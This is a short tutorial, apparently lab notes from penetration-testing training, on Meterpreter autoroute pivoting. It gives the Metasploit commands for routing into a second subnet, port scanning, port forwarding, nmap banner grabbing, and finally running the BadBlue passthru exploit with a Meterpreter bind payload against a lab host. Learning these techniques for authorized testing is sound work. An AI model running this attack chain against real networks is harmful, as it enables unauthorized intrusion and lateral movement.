Autoroute in Meterpreter is a functionality that helps you with a technique called pivoting.

In penetration testing, pivoting allows you to move laterally within a network after gaining initial access to a system. You essentially use a compromised machine as a stepping stone to reach other systems on the network.

Autoroute simplifies this process by automatically creating a route through your existing Meterpreter session. This route allows you to connect to devices on a different subnet than the initially compromised system.

Here's a breakdown of how autoroute works:

You gain a foothold on a machine using Meterpreter.
You identify another network segment you want to access.
Use the autoroute command specifying the subnet of the target network.
Meterpreter creates a route on the compromised system, allowing you to connect to devices within that subnet through the established Meterpreter session.



HERE WE GOOOOOO
We will add a route and then we will run an auxiliary port scanner module on the second victim
machine to discover a host and open ports.
-run autoroute -s <ip-cidr>

Now we will run the portscanner again to see if we can reach the target
-background
-use auxiliary/scanner/portscan/tcp
-set RHOSTS <ip>
-set PORTS 1-100
-exploit

In this case, we have discovered port 80 on the pivot machine. Now, we will forward the remote port
80 to local port 1234 and grab the banner using Nmap
-sessions -i 1
-portfwd add -l 1234 -p 80 -r <ip>
-portfwd list

We have forwarded the port, now use Nmap to find the running application name and
version.
Note: Do not close msfconsole.
-nmap -sV -sS -p 1234 localhost

After seeing that it works, we can now attack this target, in this case we find badblue is running, so we do the follwoing
use exploit/windows/http/badblue_passthru
set PAYLOAD windows/meterpreter/bind_tcp
set RHOSTS 10.0.27.99
exploit
